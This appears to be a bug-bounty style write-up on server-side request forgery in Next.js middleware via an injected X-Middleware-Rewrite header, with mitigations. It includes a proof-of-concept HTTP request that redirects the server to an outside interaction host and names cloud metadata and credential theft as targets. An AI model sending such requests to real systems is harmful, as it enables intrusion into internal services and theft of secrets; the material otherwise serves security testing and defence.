# 🚨 Next.js Middleware SSRF via Header Injection
![Next js Middleware SSRF via Header Injection](https://github.com/user-attachments/assets/13addb07-0969-4023-988a-900c531dd1d7)

A security issue in **Next.js Middleware** can allow **Server-Side Request Forgery (SSRF)** if certain headers are not properly validated.
Next.js introduced Middleware to intercept requests before they hit the final route. It uses special headers (like X-Middleware-Rewrite, X-Middleware-Next, etc.) to control routing.

If an application trusts user-supplied headers without sanitization, attackers can abuse this mechanism to rewrite requests to attacker-controlled hosts — effectively turning it into Server-Side Request Forgery (SSRF).

---

## 📌 Proof of Concept (PoC)

Send the following request:

```http
GET / HTTP/1.1
Host: target.com
Location: http://test.com
X-Middleware-Rewrite: http://test.com
```

### ✅ Explanation
If the application blindly trusts the `X-Middleware-Rewrite` header, the middleware will **fetch attacker-controlled URLs**, leading to SSRF.
- X-Middleware-Rewrite tells the Next.js server where to send the request.   
- If not validated, it forwards traffic to http://test.com (your OOB/interaction server).   
- Boom → you can force the server to connect anywhere (internal hosts, metadata services, cloud instances).
---

## 🎯 Impact
- Access internal services (e.g., `http://localhost`, `http://169.254.169.254` for cloud metadata)
- Steal sensitive information (config files, credentials, tokens)
- Pivot deeper into the internal network
- Potential step towards **RCE**

---

## 🔍 Detection Tips
- Inject custom headers like `X-Middleware-Rewrite` or `X-Middleware-Override`
- Use tools like **Burp Collaborator** or **Interactsh** to monitor callbacks
- Watch for suspicious requests from the target server

---

## 🛡 Mitigation
- Never trust client-supplied headers for middleware rewrites
- Validate and sanitize rewrite/redirect logic in **Next.js middleware**
- Apply SSRF protections:
  - Use allowlists for outbound requests
  - Block access to internal IP ranges
  - Restrict use of sensitive headers

---

## 📚 References
- [OWASP SSRF Guide](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [Next.js Middleware Docs](https://nextjs.org/docs/middleware)

---

🔐 Shared by **[@cybersecplayground](https://t.me/cybersecplayground)**  
Daily content: Bug bounty tips, payloads, CVEs, and real-world security tricks.

#SSRF #NextJS #BugBounty #WebSecurity #cybersecplayground
